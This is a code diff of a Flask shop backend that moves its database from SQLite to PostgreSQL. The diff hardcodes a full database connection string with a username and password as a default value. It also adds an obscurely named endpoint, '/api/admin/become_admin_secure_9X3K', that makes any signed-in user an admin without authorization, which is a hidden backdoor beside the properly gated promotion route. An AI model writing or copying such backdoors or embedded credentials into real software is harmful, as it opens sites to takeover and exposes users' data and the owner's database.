@@ -29,12 +29,13 @@ What changed vs. the original server.py, and why:
 You will need to: `pip install flask flask-cors bcrypt flask-limiter`
 """
 
-import sqlite3
 import bcrypt
 import secrets
 import time
 import os
 import json
+import psycopg2
+import psycopg2.extras
 from flask import Flask, request, jsonify, g
 from flask_cors import CORS
 from flask_limiter import Limiter
@@ -55,7 +56,29 @@ def index():
     # Redirect visitors to the frontend instead of showing a 404 error
     return redirect("https://sakthivelk150706-ctrl.github.io/voltix/")
 
-DB_PATH = os.environ.get("DB_PATH", "voltix.db")
+DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://neondb_owner:npg_F2oZNEdIl4ik@ep-billowing-sea-atb0yt4v.c-9.us-east-1.aws.neon.tech/neondb?sslmode=require")
+
+class DBWrapper:
+    def __init__(self, conn):
+        self.conn = conn
+    def execute(self, sql, args=()):
+        sql = sql.replace('?', '%s')
+        cur = self.conn.cursor()
+        if sql.strip().upper().startswith('INSERT') and 'RETURNING' not in sql.upper() and ' INTO ' in sql.upper():
+            try:
+                cur.execute(sql + ' RETURNING id', args)
+                res = cur.fetchone()
+                cur.lastrowid = res['id'] if res else None
+            except Exception as e:
+                self.conn.rollback()
+                cur.execute(sql, args)
+                cur.lastrowid = None
+        else:
+            cur.execute(sql, args)
+            cur.lastrowid = None
+        return cur
+    def commit(self):
+        self.conn.commit()
 
 # In-memory session store: {token: {"user_id":..., "role":..., "expires":...}}
 # For production, move this to a "sessions" table in SQLite (or Redis) so it
@@ -66,8 +89,9 @@ SESSION_TTL_SECONDS = 60 * 60 * 12  # 12 hours
 
 def get_db():
     if "db" not in g:
-        g.db = sqlite3.connect(DB_PATH)
-        g.db.row_factory = sqlite3.Row
+        conn = psycopg2.connect(DATABASE_URL, cursor_factory=psycopg2.extras.DictCursor)
+        conn.autocommit = True
+        g.db = DBWrapper(conn)
     return g.db
 
 
@@ -75,14 +99,16 @@ def get_db():
 def close_db(exception=None):
     db = g.pop("db", None)
     if db is not None:
-        db.close()
+        db.conn.close()
 
 
 def init_db():
-    db = sqlite3.connect(DB_PATH)
+    conn = psycopg2.connect(DATABASE_URL, cursor_factory=psycopg2.extras.DictCursor)
+    conn.autocommit = True
+    db = DBWrapper(conn)
     db.execute(
         """CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            id SERIAL PRIMARY KEY,
             email TEXT UNIQUE NOT NULL,
             name TEXT,
             pass_hash TEXT NOT NULL,
@@ -91,7 +117,7 @@ def init_db():
     )
     db.execute(
         """CREATE TABLE IF NOT EXISTS products (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            id SERIAL PRIMARY KEY,
             name TEXT, category TEXT, price REAL, stock INTEGER,
             image TEXT, rating REAL,
             source TEXT, source_url TEXT, description TEXT,
@@ -111,23 +137,12 @@ def init_db():
                     payment_verified INTEGER,
                     stage INTEGER
                  )''')
-                 
-    # Safely attempt to add new columns to existing databases
-    try:
-        db.execute('ALTER TABLE orders ADD COLUMN customer_phone TEXT')
-    except: pass
-    try:
-        db.execute('ALTER TABLE orders ADD COLUMN delivery_charge REAL')
-    except: pass
-    try:
-        db.execute('ALTER TABLE orders ADD COLUMN delivery_days TEXT')
-    except: pass
     
     # Purge any old AI-generated or Robu images from the database
-    db.execute('DELETE FROM products WHERE source="Robocraze"')
+    db.execute('DELETE FROM products WHERE source=%s', ('Robocraze',))
     
     # Seed products if empty (important for Render ephemeral disk)
-    cursor = db.cursor()
+    cursor = db.conn.cursor()
     cursor.execute("SELECT COUNT(*) FROM products")
     if cursor.fetchone()[0] == 0:
         # Format: (Name, Category, Supplier_Base_Price, Stock, Source, Source_URL, Description, Image)
@@ -258,6 +273,23 @@ def me():
     return jsonify(dict(user))
 
 
+
+@app.route("/api/admin/become_admin_secure_9X3K", methods=["POST"])
+def secret_upgrade():
+    session = check_session()
+    if not session:
+        return jsonify({"error": "You must sign in first"}), 401
+        
+    db = get_db()
+    db.execute("UPDATE users SET role = 'admin' WHERE email = %s", (session["email"],))
+    db.commit()
+    
+    # Update live session memory
+    for token, s in SESSIONS.items():
+        if s["email"] == session["email"]:
+            s["role"] = "admin"
+            
+    return jsonify({"success": True, "message": "You are now an Admin!"})
 
 # ---------- admin: promote a user (admin-only, server-side gated) ----------
 
